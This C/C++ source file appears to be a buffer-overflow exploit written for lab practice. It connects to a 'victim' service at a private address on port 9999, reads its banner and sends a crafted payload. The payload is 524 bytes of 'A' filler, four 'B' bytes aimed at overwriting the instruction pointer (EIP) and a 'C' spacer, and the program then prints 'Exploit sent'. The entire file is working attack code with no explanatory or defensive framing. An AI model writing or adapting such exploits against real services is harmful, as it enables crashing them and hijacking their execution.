#if defined(_WIN32)
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define ISVALIDSOCKET(s) ((s) != INVALID_SOCKET)
#define CLOSESOCKET(s) closesocket(s)
#define GETSOCKETERRNO() WSAGetLastError()
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

#define ISVALIDSOCKET(s) ((s) >= 0)
#define CLOSESOCKET(s) close(s)
#define SOCKET int
#define GETSOCKETERRNO() (errno)
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <iostream>
#include <cstring>
#include <cstdio>

int main(int argc, char** argv){
#if defined(_WIN32)
    WSADATA d;
    if(WSAStartup(MAKEWORD(2,2), &d)){
        std::cout<<"[-] Failed to initialize winsock"<<std::endl;
        return -1;
    }
#endif
    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_INET;
    struct addrinfo* peerAddress;
    if(getaddrinfo("192.168.1.128", "9999", &hints, &peerAddress)){
        std::cout<<"Failed to connect !"<<std::endl;
        return -1;
    }
    std::cout<<"GetAddrInfo"<<std::endl;

    char serviceBuffer[64];
    char addressBuffer[64];
    getnameinfo(peerAddress->ai_addr, peerAddress->ai_addrlen, addressBuffer, sizeof(addressBuffer), serviceBuffer, sizeof(serviceBuffer), NI_NUMERICHOST);

    SOCKET socketPeer = socket(peerAddress->ai_family, peerAddress->ai_socktype, peerAddress->ai_protocol);
    if(!ISVALIDSOCKET(socketPeer)){
        std::cout<<"[-] Invalid socket !"<<std::endl;
        return -1;
    }

    if(connect(socketPeer, peerAddress->ai_addr, peerAddress->ai_addrlen) != 0){
        std::cout<<"[-] Can't connect to victim !"<<std::endl;
        return -1;
    }

    freeaddrinfo(peerAddress);
    char fBytesBuffer[4096];
    recv(socketPeer, fBytesBuffer, sizeof(fBytesBuffer), 0);
    std::cout<<fBytesBuffer<<std::endl;

    char* A = "A";
    char* B = "B";
    char* C = "C";
    std::string filler(524,*A);
    std::string eip(4,*B);
    std::string spacer(16,*C);
    std::string finalExploit = filler + eip + spacer;
    std::cout<<"Final exploit : "<<finalExploit<<std::endl;
    send(socketPeer, finalExploit.c_str(), finalExploit.length(), 0);
    std::cout<<"[+] Exploit sent ! "<<std::endl;

}
